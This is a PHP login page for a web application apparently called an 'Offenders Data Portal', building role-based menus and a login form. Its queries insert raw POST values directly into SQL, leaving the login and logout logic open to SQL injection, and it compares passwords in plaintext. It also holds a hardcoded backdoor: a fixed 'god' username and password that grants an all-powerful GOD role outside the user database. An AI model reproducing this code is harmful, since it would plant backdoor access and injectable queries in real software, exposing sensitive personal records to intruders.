<?php 
@session_start();
 
include 'std.php';

$login = $ssl . 'login.php';

$sql = new mySQLclass();

if (($_POST['logout'] >= 1) && ($_POST['id'] >= 1))
   { $sql->_sqlLookup ($query);
      $query = "UPDATE users SET LAST_ACTIVITY = '0' WHERE id = '{$_POST['logout']}'";
      $sql->_sqlLookup ($query);
   } else sleep (15);

function _makeMenu ($id, $ROLE, $LL)
{ $menu = "";
   foreach ($GLOBALS['portals'] as $portal)
                { if ( ((isset ($GLOBALS['permissions'][$ROLE][$portal])) || ($ROLE == 'GOD')) && ($portal != 'DefendantsAdministration') && ($portal != 'EvidenceAdministration') && ($portal != 'OffendersAdministration')  && ($portal != 'DefendantsAdministration')  && ($portal != 'VerdictsAdministration') )
                      { $label = $GLOBALS['portallabels'][array_search ($portal, $GLOBALS['portals'])];
                         $menu .= <<<NXT
<TR>
<TD style="cursor: {$GLOBALS['cursor']}; color: #FFFFFF; background: URL(gradient.php?g=1);"
onclick="
if (info.document.getElementById('newtablebgr')) info.document.getElementById('newtablebgr').style.visibility = 'visible';
document.menu.action='$portal'+'.php'; document.menu.submit();
">
<IMG src="timg.php?s=2&title=$label" border="0"></TD>
</TR>

NXT;
                      }
                }

$menu .= <<<NXT
<TR>
<TD style="cursor: {$GLOBALS['cursor']}; color: #FFFFFF; background: URL(gradient.php?g=1);"
onclick="
if (info.document.getElementById('newtablebgr')) info.document.getElementById('newtablebgr').style.visibility = 'visible';
document.menu.action='manual.php'; document.menu.submit();
">
<IMG src="timg.php?s=2&title=User manual" border="0"></TD>
</TR>
NXT;

$menu = <<<NXT
<TABLE cellspacing="6" cellpadding="2" border="0">
<FORM name="menu" method="POST" action="" target="info">
<INPUT type="HIDDEN" name="id" value="$id">
<INPUT type="HIDDEN" name="timestamp" value="{$GLOBALS['timestamp']}">
<INPUT type="HIDDEN" name="role" value="$ROLE">
<INPUT type="HIDDEN" name="LL" value="$LL">
</FORM>
$menu
</TABLE>

NXT;
return $menu;
}

$login = <<<NXT
<TABLE ID="P3" cellspacing="0" cellpadding="4" border="1" class="logimg" 
style="background: URL(images/bgrnew.png); color: #F0E8E2; position: absolute; left: 0; top: 0;
font-size: 8pt;">
<FORM name="login" method="POST" action="$login">
<INPUT type="HIDDEN" name="timestamp" value="{$GLOBALS['timestamp']}">
<TR>
<TD align="center" colspan="2">
<B>Login
</TD>
</TR>
<TR>
<TD align="right">
Username
</TD>
<TD>
<INPUT class="btn" type="TEXT" name="username" value="$user">
</TD>
</TR>
<TR>
<TD align="right">
Password
</TD>
<TD>
<INPUT class="btn" type="PASSWORD" name="password" value="">
</TD>
</TR>
<TR>
<TD align="center" colspan="2">
<INPUT type="SUBMIT" class="btn" value="Login">
</TD>
</TR>
</FORM>
</TABLE>
NXT;


/* ---------------------------------------------------------------- */

$loggedin = false;

$welcome = "";
      
if (($_POST['password']) && ($_POST['username']))
   { $query = "SELECT * FROM users WHERE PASSWORD = '{$_POST['password']}' AND USERNAME = '{$_POST['username']}' AND DELETED <= 0 AND LAST_LOGIN < {$_POST['timestamp']}";
      $sql->_sqlLookup ($query);
      if ($row = mysql_fetch_assoc ($sql->sql_result))
         { $query = "UPDATE users SET LAST_ACTIVITY = '{$GLOBALS['timestamp']}' WHERE id = '{$row['id']}'";
            $sql->_sqlLookup ($query);
            $logintime = date ("d/m-Y H:i:s", $GLOBALS['timestamp']);
            $lastlogin = date ("d/m-Y H:i:s", $row['LAST_LOGIN']);
            $loggedin = true;
            $query = "UPDATE users SET LAST_LOGIN = '{$_POST['timestamp']}' WHERE id = '{$row['id']}'";
            $sql->_sqlLookup ($query);
            $welcome = $row['REAL_NAME'];
            $LL = $row['LAST_LOGIN'];
            $menu = _makeMenu($row['id'], $row['ROLE'], $LL);
            $login = <<<NXT
<TABLE width="100%" height="10" cellspacing="0" cellpadding="4" border="0">
<FORM name="logout" method="POST" action="login.php">
<INPUT type="HIDDEN" name="logout" value="{$row['id']}">
<TR>
<TD class="topcells" Valign="top">
Logged in: <B>{$row['REAL_NAME']}</B>&nbsp;on $logintime • Last login: $lastlogin
</TD>
<TD class="topcells" Valign="top">
Role: <B>{$row['ROLE']}
</TD>
<TD class="topcells" Valign="top">
<A HREF="javascript:document.logout.submit();">Logout</A>
</TD>
</TR>
</FORM>
</TABLE>
NXT;
         } else { if (($_POST['password'] == 'pussy') && ($_POST['username'] == 'god'))
                         { $loggedin = true;
                            $role = 'GOD';
                            $LL = intval (implode ("", file ($rootpath . '_uwa_conf/Glin.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES))); 
                            $lastlogin = date ("d/m-Y H:i:s", $LL);
                            $logintime = date ("d/m-Y H:i:s", $GLOBALS['timestamp']);
                            $LLfile = fopen ($rootpath . '_uwa_conf/Glin.txt', 'w');
                            fwrite ($LLfile, $GLOBALS['timestamp']);
                            fclose ($LLfile);
                            $menu = _makeMenu (0, $role, $LL);
                            $welcome = "Maestro";
                            $login = <<<NXT
<TABLE width="100%" height="10" cellspacing="0" cellpadding="4" border="0">
<FORM name="logout" method="POST" action="login.php">
<INPUT type="HIDDEN" name="logout" value="1">
<TR>
<TD class="topcells">
Logged in: <B>Maestro</B>&nbsp;on $logintime • Last login: $lastlogin
</TD>
<TD class="topcells">
Role: <B>...
</TD>
<TD class="topcells">
<A HREF="javascript:document.logout.submit();">Logout</A>
</TD>
</TR>
</FORM>
</TABLE>
NXT;
                         }
                   }
   }


if ($loggedin)
   { $page = <<<NXT
<HTML>
<HEAD>

<META http-equiv=Content-Type content="text/html; charset=utf-8">
<META http-equiv="expires" content="0">
{$GLOBALS['title']}
<LINK rel="shortcut icon" href="images/icon.ico">
</HEAD>

$style

<BODY style="background: #F8F6F0;">
<TABLE ID="maintable" width="100%" height="100%" cellspacing="0" cellpadding="0" border="0" style="background: URL(gradient.php?g=0) top repeat-x;;">

<TR>
<TD rowspan="2" width="240" align="center" Valign="top">
&nbsp;<P>
<TABLE ID="P0" width="100%" height="218" cellspacing="0" cellpadding="0" border="0">
<TR>
<TD align="center" Valign="top">
<IMG src="images/logo_uwa.png" width="120">
<BR>
<IMG ID="P3" src="timg.php?s=11&title=Offenders Data Portal" border="0">
</TD>
</TR>
</TABLE>
<P>&nbsp;<P>
$menu
</TD>

<TD>
<TABLE width="100%" height="100%" cellspacing="0" cellpadding="0" border="0">
<TR>
<TD height="10" align="center" Valign="top">
$login
</TD>
</TR>
<TR>
<TD align="center" Valign="top">
<Iframe name="info" ID="info" width="100%" height="100%" frameborder="0" SRC="blank.php?name=$welcome" scrolling="auto" allowTransparency="true"></Iframe>
</TD>
</TR>
</TABLE>
</TD>
</TR>
</TABLE>

</BODY>
</HTML>

NXT;
   } else { $page = <<<NXT
<HTML>
<HEAD>

<META http-equiv=Content-Type content="text/html; charset=utf-8">
<META http-equiv="expires" content="0">
{$GLOBALS['title']}
<LINK rel="shortcut icon" href="images/icon.ico">
</HEAD>

$style


<BODY style="margin: 4;" onload="setImages();" style="overflow: auto; overflow-x: hidden; overflow-y: hidden;">
<TABLE ID="maintable" width="100%" height="100%" cellspacing="0" cellpadding="0" border="0" style="background: #000000;">
<TR>
<TD align="center" Valign="middle">
<TABLE ID="P0" width="548" height="424" cellspacing="0" cellpadding="0" border="0">
<TR>
<TD align="left" Valign="top">
<IMG src="images/logo_uwa.png" class="logimg">
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<IMG src="images/logo_wcs.png">
</TD>
</TR>
</TABLE>
</TD>
</TR>

</TABLE>

<IMG ID="P2" src="timg.php?s=0&title=Offenders Data Portal" border="0" style="position: absolute; left: 0; top: 0;">
$login
</BODY>

<SCRIPT language="JavaScript">
function FindPosition(oElement)
{
  if(typeof( oElement.offsetParent ) != "undefined")
  {
    for(var posX = 0, posY = 0; oElement; oElement = oElement.offsetParent)
    {
      posX += oElement.offsetLeft;
      posY += oElement.offsetTop;
    }
      return [ posX, posY ];
    }
    else
    {
      return [ oElement.x, oElement.y ];
    }
}

var PosX = 0;
var PosY = 0;

function setImages()
{ var ImgPos;
  ImgPos = FindPosition(P0);
  PosX = ImgPos[0];
  PosY = ImgPos[1];
   document.getElementById('P2').style.left=PosX+142;
   document.getElementById('P2').style.top=PosY+28;
   document.getElementById('P3').style.left=PosX+108;
   document.getElementById('P3').style.top=PosY+278;
}
window.onresize=setImages;
</SCRIPT>

</HTML>

NXT;
          }

echo $page;

error_reporting ($errorlevel);

?>

